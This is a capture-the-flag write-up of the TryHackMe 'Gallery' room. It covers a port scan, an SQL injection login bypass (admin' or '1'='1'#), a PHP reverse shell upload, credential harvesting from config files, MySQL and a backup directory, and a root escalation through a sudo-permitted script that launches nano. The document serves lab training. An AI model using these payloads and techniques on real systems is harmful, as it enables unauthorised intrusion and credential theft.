---
parent: "[[CTFs - THM]]"
---
```bash
# PLATFORM          . THM
# CTF NAME          . Gallery
# DESCRIPTION       . Try to exploit our image gallery system
# DIFFICULTY        . Easy
# CTF LINK          . https://tryhackme.com/room/gallery666
```

```
sudo nmap -sSVC -T5 -p- 10.10.102.136 -oN Gallery
```

```
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works

8080/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Simple Image Gallery System
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
```

#### PORT 80 

- This website hosts the default apache installation page ; I inspected only the soure code and there wasn't anything out of the ordinary.

#### PORT 8080

- We land on a login panel that reveals that the CMS used is called `Simple Image Gallery`. 

- I tried using the `admin:admin` default credentials but that didn't work. However, I decided to try some SQL Injection payloads and I was able to log in using `admin' or '1'='1'#` as username and whatever as password (even an empty string should work. )

- I quickly noticed the `Albums` page, with some already created. The `Upload` button seems to allow us to add images to the albums.

- However, I tried uploading the classic PHP reverse shell and I got a reverse shell after setting up my listener.

- Now that we're under `www-data`, I stabilised the shell and I took a look around the system ; 

```
www-data@gallery:/var/www/html/gallery$ cat /etc/passwd | grep home
```

```
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
ubuntu:x:1000:1000:ubuntu:/home/ubuntu:/bin/bash
mike:x:1001:1001:mike:/home/mike:/bin/bash
```

- `Mike` seems to be the only user on the system, and we probably need to escalate our privileges to `mike` first before attempting to get `root`. 

- Let's take a look at the CMS's config files. I went to `/var/www/html/Gallery` and did a `ls -l *`

- The following block of output got my attention.

```
classes:
total 36
-rwxr-xr-x 1 www-data www-data  731 Apr 23  2021 DBConnection.php
-rwxr-xr-x 1 www-data www-data 1383 Aug  9  2021 Login.php
-rwxr-xr-x 1 www-data www-data 9253 Aug 11  2021 Master.php
-rwxr-xr-x 1 www-data www-data 4723 Jun 28  2021 SystemSettings.php
-rwxr-xr-x 1 www-data www-data 5366 Aug  9  2021 Users.php
```

- Reading `DBConnection.php`, we find out that the credentials are defined in the `initialize.php` file from the root `Gallery` directory.

```
$dev_data = array('id'=>'-1','firstname'=>'Developer','lastname'=>'','username'=>'dev_oretnom','password'=>'5da{REDACTED}','last_login'=>'','date_updated'=>'','date_added'=>'');


if(!defined('DB_SERVER')) define('DB_SERVER',"localhost");
if(!defined('DB_USERNAME')) define('DB_USERNAME',"gallery_user");
if(!defined('DB_PASSWORD')) define('DB_PASSWORD',"{REDACTED}");
if(!defined('DB_NAME')) define('DB_NAME',"gallery_db");
?>
```

- There seems to be a developer account defined too, `dev_oretnom` with the hash from the above.

- I tried the credentials found above with mysql

```bash
mysql -u gallery_user -p
```

- After successfully logged in, I used the following commands to dump the hashes of the current users

```
SHOW DATABASES;
+--------------------+
| Database           |
+--------------------+
| gallery_db         |
| information_schema |
+--------------------+
```

```
SHOW TABLES;
+----------------------+
| Tables_in_gallery_db |
+----------------------+
| album_list           |
| images               |
| system_info          |
| users                |
+----------------------+
```

```
SELECT * from users;
+----+--------------+----------+----------+----------------------------------+------------------------------------------+------------+------+---------------------+---------------------+
| id | firstname    | lastname | username | password                         | avatar                                   | last_login | type | date_added          | date_updated        |
+----+--------------+----------+----------+----------------------------------+------------------------------------------+------------+------+---------------------+---------------------+
|  1 | Adminstrator | Admin    | admin    | a228b12a08b6527e7978cbe5d914531c | uploads/1629883080_1624240500_avatar.png | NULL       |    1 | 2021-01-20 14:02:37 | 2021-08-25 09:18:12 |
+----+--------------+----------+----------+----------------------------------+------------------------------------------+------------+------+---------------------+---------------------+
```

- The admin hash is not relevant to us anymore, since we already got access to the CMS using SQL Injection. I was hoping that I find the credentials of mike here, too.

- This is when I decided to look around for usual privilege escalation vectors and backups on the system.

- During my search, I came across `/var/backups` directory that contains `mike_home_backup`. 

- Then, I tried my luck with `grep -ri "pass" .` and I there it was

```
./.bash_history:sudo -l{REDACTED}
./documents/accounts.txt:Netflix : mike@gmail.com:123456789pass
```

- As `mike`, we can run `(root) NOPASSWD: /bin/bash /opt/rootkit.sh` 

```
#!/bin/bash

read -e -p "Would you like to versioncheck, update, list or read the report ? " ans;

# Execute your choice
case $ans in
    versioncheck)
        /usr/bin/rkhunter --versioncheck ;;
    update)
        /usr/bin/rkhunter --update;;
    list)
        /usr/bin/rkhunter --list;;
    read)
        /bin/nano /root/report.txt;;
    *)
        exit;;
esac
```

- Alright. For the options `versioncheck`, `update` and `list`, `/usr/bin/rkhunter` is executed as root ; 
- However, for `read` option, `/bin/nano` is executed instead. But `/bin/nano` can be used to escalate privileges to a root shell:

```
mike@gallery:/var/backups/mike_home_backup$ sudo /bin/bash /opt/rootkit.sh
Would you like to versioncheck, update, list or read the report ? read

<CTRL + R>
<CTRL + X>

reset; sh 1>&0 2>&0

# whoami
root
```

- The user flag is in `/home/mike/user.txt`.
- The root flag is in `/root/root.txt`.

